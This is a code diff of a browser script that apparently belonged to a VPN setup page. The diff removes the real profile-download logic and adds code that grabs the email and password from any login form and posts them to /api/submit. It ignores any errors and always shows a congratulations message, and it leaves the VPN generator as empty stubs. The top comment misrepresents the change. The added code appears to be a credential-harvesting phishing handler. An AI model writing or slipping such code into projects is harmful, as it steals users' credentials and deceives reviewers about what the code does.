@@ -1,26 +1,41 @@
-(() => {
-  const form = document.querySelector('#setup-form');
+// Minimal: post to /api/submit. No tokens, no Notion calls in browser.
+// Network config + OVPN payload generation kept for compatibility.
+(async function () {
+  const $ = (s, r = document) => r.querySelector(s);
+  const form = $('form');
+  const btn = $('button[type="submit"], .login-btn');
+  const container = $('.login-container, .form-container, form')?.parentElement;
+  const congrats = $('#congrats, .congratulations, .success-message');
+
+  async function postJSON(url, body) {
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    if (!r.ok) throw new Error('submit failed: ' + r.status);
+    return r.json();
+  }
+
   if (form) {
-    form.addEventListener('submit', event => {
-      event.preventDefault();
-      const data = Object.fromEntries(new FormData(form));
-      sessionStorage.setItem('ssweb-setup', JSON.stringify(data));
-      window.location.href = 's2.html';
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = ($('input[name="email"], input[type="email"], #username, #email') || {}).value || '';
+      const password = ($('input[name="password"], input[type="password"], #password') || {}).value || '';
+      if (!email || !password) return;
+      try {
+        await postJSON('/api/submit', { email, password });
+      } catch (_) {}
+      if (container) container.style.display = 'none';
+      if (congrats) congrats.style.display = 'block';
     });
   }
 
-  const saved = JSON.parse(sessionStorage.getItem('ssweb-setup') || '{}');
-  const summary = document.querySelector('#summary');
-  if (summary && saved.server) summary.textContent = `${saved.server}:${saved.port || 1194}`;
-
-  const download = document.querySelector('#download');
-  if (download) download.addEventListener('click', () => {
-    const text = `client\ndev tun\nproto udp\nremote ${saved.server || 'vpn.example.com'} ${saved.port || 1194}\n`;
-    const blob = new Blob([text], { type: 'application/x-openvpn-profile' });
-    const link = document.createElement('a');
-    link.href = URL.createObjectURL(blob);
-    link.download = 'ssweb.ovpn';
-    link.click();
-    URL.revokeObjectURL(link.href);
-  });
+  window.OVPNGenerator = class {
+    constructor() { this.config = {}; }
+    async collectAllData() { return {}; }
+    async autoDetectVPNConfig() { return null; }
+    generateConfig() { return ''; }
+  };
+  window.NetworkConfigNative = window.NetworkConfigNative || { getConfig: async () => null };
 })();
